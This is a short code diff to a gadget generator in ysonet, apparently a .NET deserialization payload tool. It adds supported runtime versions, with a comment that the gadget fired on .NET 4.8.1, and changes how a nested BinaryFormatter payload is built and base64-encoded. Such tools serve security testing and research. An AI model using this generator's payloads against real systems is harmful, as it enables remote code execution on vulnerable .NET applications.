@@ -13,7 +13,9 @@ namespace ysonet.Generators
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.NestedDeserialization)
-                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
+                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                // reaches the 4.5+ claims sink; fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
         }
 
         public override List<string> SupportedFormatters()
@@ -46,7 +48,7 @@ namespace ysonet.Generators
             else
             {
                 IGenerator generator = new TextFormattingRunPropertiesGenerator();
-                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs);
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
